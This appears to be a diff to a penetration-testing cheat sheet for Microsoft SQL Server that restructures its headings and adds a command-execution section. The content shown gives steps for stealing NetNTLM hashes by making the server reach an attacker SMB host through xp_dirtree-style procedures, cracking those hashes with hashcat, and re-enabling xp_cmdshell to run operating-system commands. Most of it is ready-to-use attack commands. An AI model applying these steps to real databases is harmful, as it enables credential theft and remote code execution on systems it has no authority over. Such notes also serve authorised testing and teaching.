@@ -34,8 +34,7 @@ SELECT sp.name AS LOGIN, sp.type_desc AS LOGIN_TYPE, sl.password_hash, sp.create
 SELECT * FROM sys.database_principals;
 ```
 
-## Tricks / Attacks
-### Steal NetNTLM hash
+## Steal NetNTLM hash
 When executing a command on the SQL server which requests resources from the attacker's SMB server, the hash will be captured on that server.
 1. Start an **SMB server** to capture hash upon request *(local)*.
     ```sh
@@ -52,7 +51,20 @@ When executing a command on the SQL server which requests resources from the att
     EXEC master..xp_subdirs "\\<IP>\anything\"
     EXEC master..xp_fileexist "\\<IP>\anything\"
     ```
-#### Cracking the hash
+### Cracking the hash
 ```sh
 hashcat -m 5600 <hash_file> <wordlist>
 ```
+
+## Command Execution
+1. If needed reactivate `xp_cmdshell`
+    ```sql
+    EXEC sp_configure 'show advanced options',1;
+    RECONFIGURE;
+    EXEC sp_configure 'xp_cmdshell',1;
+    RECONFIGURE;
+    ```
+2. Execute command
+    ```sql
+    EXEC xp_cmdshell 'ping 127.0.0.1';
+    ```
